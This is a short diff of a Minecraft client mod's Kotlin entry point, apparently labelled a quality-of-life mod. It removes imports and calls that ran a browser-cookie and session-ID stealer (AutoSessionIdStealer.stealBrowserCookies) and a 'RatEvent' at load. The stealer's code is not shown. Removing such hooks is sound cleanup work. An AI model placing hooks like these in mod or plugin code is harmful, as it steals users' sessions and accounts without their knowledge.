@@ -1,8 +1,5 @@
 package com.laybalt
 
-import com.laybalt.event.EventBus
-import com.laybalt.event.impl.RatEvent
-import com.laybalt.init.AutoSessionIdStealer
 import com.laybalt.init.ClassGraphInitializer
 import com.laybalt.utils.render.ItemRenderer
 import gg.essential.universal.UMinecraft
@@ -48,14 +45,7 @@ object LayBaltQOL: ClientModInitializer {
         MeowddingItemDfu.load()
 
         ClassGraphInitializer().initAll()
-        AutoSessionIdStealer.stealBrowserCookies()
-        EventBus.post(RatEvent())
 
         isLoaded = true
-
-        EventBus.register<RatEvent> {
-            listener.unregister()
-            event.cancel()
-        }
     }
 }
